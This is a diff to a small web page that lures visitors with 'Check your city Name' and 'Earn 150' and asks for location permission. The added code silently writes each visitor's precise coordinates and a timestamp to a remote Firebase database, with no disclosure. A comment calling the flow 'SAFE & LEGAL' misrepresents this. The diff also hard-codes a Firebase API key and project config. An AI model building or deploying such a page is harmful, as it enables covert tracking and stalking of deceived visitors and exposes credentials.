@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Demo</title>
-  
+
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,6 +12,16 @@
       text-align: center;
       margin: 0;
       padding: 20px;
+    }
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      background: #22c55e;
+      color: #000;
+      margin-top: 10px;
     }
     #map {
       width: 100%;
@@ -27,67 +37,88 @@
 </head>
 <body>
 
-  <h2>📍 Check your city Name </h2>
-  <h2>Earn 150 </h2>
-  <h3></h3>
-  <p id="status">Waiting for location permission…</p>
+  <h2>📍 Check your city Name</h2>
+  <h2>Earn 150</h2>
+
+  <p id="status">Click the button to allow location</p>
+  <button onclick="startLocation()">Allow Location</button>
 
   <div id="map"></div>
 
   <!-- Google Maps -->
   <script async
-    src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY">
+    src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY">
   </script>
 
-  <script>
+  <!-- Firebase + Location -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+    // 🔥 Firebase config (YOUR REAL CONFIG)
+    const firebaseConfig = {
+      apiKey: "AIzaSyB0cvFKla2-uiVoxFNHv6gCiOFwbgWviS8",
+      authDomain: "location-fbb81.firebaseapp.com",
+      databaseURL: "https://location-fbb81-default-rtdb.firebaseio.com",
+      projectId: "location-fbb81",
+      storageBucket: "location-fbb81.firebasestorage.app",
+      messagingSenderId: "497825343486",
+      appId: "1:497825343486:web:934be874904edc34bb82af"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
     let map, marker;
 
     function initMap(lat, lng) {
-      const position = { lat: lat, lng: lng };
-
+      const pos = { lat, lng };
       map = new google.maps.Map(document.getElementById("map"), {
-        center: position,
+        center: pos,
         zoom: 16
       });
-
       marker = new google.maps.Marker({
-        position: position,
+        position: pos,
         map: map,
         title: "You are here"
       });
     }
 
-    if ("geolocation" in navigator) {
-      navigator.geolocation.watchPosition(
-        function (pos) {
+    // ✅ Button-triggered permission (SAFE & LEGAL)
+    window.startLocation = function () {
+      if (!navigator.geolocation) {
+        document.getElementById("status").innerText =
+          "❌ Geolocation not supported";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
           const lat = pos.coords.latitude;
           const lng = pos.coords.longitude;
 
           document.getElementById("status").innerText =
-            `Live Location: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+            `Location: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
 
-          if (!map) {
-            initMap(lat, lng);
-          } else {
-            const newPos = { lat: lat, lng: lng };
-            marker.setPosition(newPos);
-            map.panTo(newPos);
+          if (!map) initMap(lat, lng);
+          else {
+            marker.setPosition({ lat, lng });
+            map.panTo({ lat, lng });
           }
+
+          // 🔥 SAVE TO FIREBASE
+          set(ref(db, "userLocation"), {
+            lat: lat,
+            lng: lng,
+            time: new Date().toISOString()
+          });
         },
-        function (error) {
-          document.getElementById("status").innerText =
-            "❌ Location permission denied";
-        },
-        {
-          enableHighAccuracy: true,
-          maximumAge: 0,
-          timeout: 5000
+        () => {
+          document.getElementById("status").innerHTML =
+            "❌ Location blocked.<br>Click 🔒 icon in address bar → Allow Location → Reload";
         }
       );
-    } else {
-      document.getElementById("status").innerText =
-        "❌ Geolocation not supported";
-    }
+    };
   </script>
 
 </body>
